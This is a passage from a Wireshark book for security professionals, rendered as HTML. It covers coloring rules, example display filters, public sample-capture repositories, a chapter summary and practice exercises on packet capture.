style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >| sort | uniq -c</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You should now have a list of accessed files over SMB without programming one line of code.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:6.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This is a glimpse at the power of filters and Wireshark in general. The workflow described in this section is not unique to SMB or this specific case. It can be applied to a lot of protocols by leveraging the excellent bundled dissectors in Wireshark, which support the most popular protocols. By applying this workflow, you can solve a lot of your network-related queries or problems with just filters and some simple elimination.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Packet Colorization</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >By now you have seen that Wireshark color codes the packets in the Packet List pane. Some people will find this helpful; others will turn it off. It&#8217;s a personal choice, of course. Before any hasty reaction, let&#8217;s discuss what&#8217;s behind the color coding.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Colors are assigned to the packets in one of two ways. The first way packets get colored is defined by the Coloring Rules, a </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >persistent </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >feature of Wireshark. These colors stay as they are configured after Wireshark is shut down or restarted. The second way is temporarily assigning colors to assist for a particular capture. Temporary coloring lasts only for as long as Wireshark is showing that capture. Going forward, we delve into how both of these can be helpful.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.9500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Persistent Colors, by Rule</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:6.3500pt;" ><a name="_bookmark355" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Coloring Rules, previously called color filters, are persistent, but highly adjustable and scalable. You can view them by clicking the View option on the top menu bar and then selecting Coloring Rules. You get a dialog box like that shown in<a name="_bookmark356" ></a>&nbsp;</span><span><a href="#_bookmark357" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-32</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Each rule has a friendly</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section183" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:52.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >name and has the filter associated with it. Foreground and Background buttons appear near the bottom when any rule is highlighted and enable you to fine-tune the background or font coloring.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="130"  height="0" ></td></tr><tr><td></td><td><img width="760"  height="854"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker236710.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark357" ></a><span><a href="#_bookmark356" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-32:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Adjusting packet colors</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Far more important than adjusting colors, you can adjust the rule</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section184" ><p class=MsoBodyText  style="margin-top:3.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >condition itself. Double-clicking on a filter allows you to edit and change the reason for coloring a packet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For example, say you want to adjust the ICMP rule. Right now, the rule colors packets matching this condition:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >icmp || icmpv6</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><a name="_bookmark358" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Basically, any ICMP packet, whether IPv4 or IPv6, gets colored that shade of pink. But what if you want to specify ICMP packets coming only from a particular subnet? Then you would adjust the rule to perhaps this:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >icmp || icmpv6 && ip.src==192.168.0.0/16</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now when ping packets originating from the 192.168.0.0 subnet are captured, they will appear in that color. You can use the display filter syntax to adjust any coloring rule.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Temporary Colors, by Choice</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:9.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The second way packets get colored is by temporarily assigning colors. To colorize an entire conversation (a stream between two or more devices), simply right-click a packet in the Packet List pane and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >choose Colorize Conversation. As shown in<a name="_bookmark359" ></a>&nbsp;</span><span><a href="#_bookmark360" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-33</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, you have the option of what layer to distinguish with a</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >color.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section185" ><p class=MsoBodyText ><img width="780"  height="724"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker237895.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark360" ></a><span><a href="#_bookmark359" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-33:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Colorizing conversations</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:9.0500pt;" ><a name="_bookmark361" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In older versions of Wireshark, supported by their documentation, the choice of layer was made for you, coloring &#8220;based on TCP first, then UDP, then IP, and at last Ethernet.&#8221; The coloring of packets is obviously very flexible. From the GUI and figures, you see how granular a change you can make.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Using Coloring Rules for Troubleshooting</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Besides being catchy for the eyes, using colors to distinguish packets can help in troubleshooting. Colorizing the Packet List pane can be</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section186" ><p class=MsoBodyText  style="margin-top:4.4500pt;margin-right:11.1500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >revealing, for example, when you are investigating a particular protocol, gauging how often a port appears, or tracing an exchange between devices. When you select and configure your own set of color rules, you also have the option to save your color scheme and even export it for another Wireshark platform or for others to use.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Going further, a collection of color rule sets is available for you to use. On the Wireshark site at the following address, you will find rule sets sent in by Wireshark community members for a wide range of scenarios:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span><a href="https://wiki.wireshark.org/ColoringRules" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >https://wiki.wireshark.org/ColoringRules</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Given all the above, we hope to further remove any mystery on why packets appear the way they do in the GUI. Experiment as you like with the two ways of coloring packets you capture or view from other captures.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark362" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Viewing Someone Else¡¯s Captures" ></a>Viewing Someone Else&#8217;s Captures</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You might find capturing packets at home somewhat predictable. For fun, you browsed a few sites, turned on an extra PC or tablet, and maybe transferred a file or text. It is interesting to watch the SMB, DNS, and DHCP traffic. The next step is capturing traffic while you log into an FTP site&#8212;and yes, there&#8217;s the password in cleartext!</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >But even after a few experiments like that, your local traffic gets boring. Maybe you want to see protocols that aren&#8217;t available locally. Or you&#8217;re curious about malware or some certain malicious packet volley. It&#8217;s time to find some capture files somewhere else.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You could search using Google, and sure, there are many sources. Instead, let&#8217;s save the hunting time and offer some of the best sources of pcap files.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-left:30.5000pt;text-indent:-22.5000pt;line-height:145%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >First, a repository from a familiar site: </span><span><a href="https://wiki.wireshark.org/SampleCaptures" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >https://wiki.wireshark.org/SampleCaptures</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This page includes an exhaustive list of protocol-specific pcap files. If there is any one protocol you want to view, or compare against another, this is your source. It can be very interesting to view the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section187" ><p class=MsoBodyText  style="margin-top:3.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >exchange between systems for a number of protocols.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-left:30.5000pt;text-indent:-22.5000pt;line-height:145%;" ><a name="_bookmark363" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Second, a repository especially appealing for security professionals: </span><span><a href="http://www.netresec.com/?page=PcapFiles" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >http://www.netresec.com/?page=PcapFiles</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >NETRESEC is a software vendor based in Sweden that develops tools for network analysis. With a specialization in network security, it has an impressive set of pcap files you should enjoy parsing through, including those from Capture the Flag events and other competitions, plenty of malware, and forensics traces.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark364" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Summary" ></a>Summary</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:8.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This chapter has shown a few methods of capturing traffic. To best understand how traffic gets captured, it was first necessary to refresh your understanding about the localhost, its loopback adapter, and what kinds of traffic you can expect to find locally. We captured traffic, both using the GUI and command-line tool TShark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Beyond the localhost, we covered traffic behavior on the network and how promiscuous mode allows you to see packets beyond your system&#8217;s needs. You can capture traffic between VMs or across network devices such as hubs and switches. Remembering the key differences between these devices can help answer questions about why you see the traffic you do&#8212;or don&#8217;t.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There was a lot of discussion about when sniffing involves switches. One solution is to create a spanning port, by managing a switch&#8217;s configuration, to mirror or copy desired traffic to a specific port.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Another solution is to use a network tap, which basically replicates network traffic from one or more ports to other ports. Finally, regarding wireless networks, we know that Wireshark can be a challenge. You learned how to enable your own wireless network adapter to view all packets in monitor mode. While a challenge, you can monitor all wireless traffic as well as monitor several WiFi stations, given the right tools and platform.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We discussed the primary supported file formats, explored how to use ring buffers, and divide captures into multiple files. Going the other</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section188" ><p class=MsoBodyText  style="margin-top:3.9500pt;margin-right:17.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >way, we merged several capture files into one capture file using the command-line tool mergecap. With each capture file handled in Wireshark, the tool adds to a list of recent files opened. We discussed how to better manage that list.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We discussed how Wireshark interprets the packet streams through dissectors. Using the W4SP Lab, we walked through an example of how a dissector can misinterpret a capture&#8212;and how to fix it. Lastly, related to dissectors, we discussed in depth how colorization works in the Packet List pane. You can now configure your own rule set as well as share it with others in the community.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark365" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Exercises" ></a>Exercises</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=17  style="margin-top:9.8500pt;margin-right:17.9000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l16 level1 lfo11;" ><a name="_bookmark366" ></a><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Perform two captures, one in promiscuous mode and one not in promiscuous mode. Find any packets only in the trace captured in promiscuous mode. What packet details made you determine</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.5500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >how the trace was</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >done?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6500pt;margin-right:8.1500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l16 level1 lfo11;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Is there a display filter you could have used to rule out the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >localhost as either a source or</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >destination?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:8.8500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l16 level1 lfo11;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Find the ARP traffic within the packet dump and ensure the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >correct dissector is applied to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  align=justify  style="margin-top:7.6000pt;margin-right:38.6500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:justify;text-justify:inter-ideograph;mso-list:l16 level1 lfo11;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Design a display filter that will help you see DHCP request and response traffic for when another machine first connects to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6000pt;margin-right:68.0500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l16 level1 lfo11;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >5.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Sniff on a host-only network, a NAT network, and a</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.7500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >bridge network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-21.0000pt;text-align:left;mso-list:l16 level1 lfo11;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >6.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Sniff some encrypted WiFi traffic. What do you</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.6500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >see?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7500pt;margin-right:14.5000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-19.5000pt;text-align:left;mso-list:l16 level1 lfo11;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >7.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Set up your own host-only network using Linux bridging. (Hint: You can use TUN/TAP attached to a Linux bridge, and then</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >bridge the virtual machines to these</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interfaces.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
